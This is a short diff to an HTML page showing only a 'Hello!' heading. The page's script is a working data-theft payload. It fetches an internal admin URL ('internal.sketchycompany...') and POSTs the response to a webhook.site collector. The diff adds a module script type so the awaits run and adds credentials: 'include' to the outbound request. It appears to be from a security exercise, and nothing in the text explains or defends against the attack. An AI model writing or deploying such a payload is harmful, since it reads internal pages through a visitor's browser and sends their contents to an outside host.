@@ -7,12 +7,13 @@
 <body>
   <h1>Hello!</h1>
 
-  <script>
+  <script type="module">
     let x = await fetch("https://internal.sketchycompany.upd-dcs.work/admin");
     let y = await x.text();
     fetch("https://webhook.site/c5e41cdc-b634-41f1-afa4-7e34f8442e0d", {
       method: "POST",
       body: y,
+      credentials: "include",
     })
   </script>
 </body>
